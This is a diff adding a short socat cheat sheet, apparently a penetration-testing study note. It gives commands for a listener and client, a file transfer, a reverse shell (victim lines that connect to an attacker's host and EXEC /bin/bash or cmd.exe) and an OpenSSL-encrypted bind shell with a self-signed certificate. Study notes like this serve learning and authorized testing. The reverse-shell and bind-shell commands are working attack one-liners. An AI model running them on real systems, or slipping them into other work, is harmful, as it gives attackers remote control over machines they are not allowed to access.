@@ -1,0 +1,38 @@
+======
+server
+======
+sudo socat TCP4-LISTEN:<port> STDOUT
+
+======
+client
+======
+socat - TCP4:<server ip>:<server port>
+
+=============
+file transfer
+=============
+sender
+	sudo socat TCP4-LISTEN:<port>,fork file:<filename>
+receiver
+	socat TCP4:<sender ip>:<sender port> file:<filename>,create
+
+=============
+reverse shell
+=============
+attacker
+	sudo socat -d -d TCP4-LISTEN:<port> STDOUT
+victim
+	socat TCP4:<attacker ip>:<attacker port> EXEC:/bin/bash
+	socat TCP4:<attacker ip>:<attacker port> EXEC:/windows/system32/cmd.exe
+
+====================
+encrypted bind shell
+====================
+create self signed certificate and key
+	openssl req -newkey rsa:2048 -nodes -keyout <key name>.key -x509 -days 362 -out <certificate name>.crt
+	cat <key name>.key <certificate name>.crt > <pem cert name>.pem
+open listener
+	sudo socat OPENSSL-LISTEN:<port>,cert=<pem cert name>.pem,verify=0,fork EXEC:/bin/bash
+
+connect to listener
+	socat - OPENSSL:<listener ip>:<listener port>,verify=0
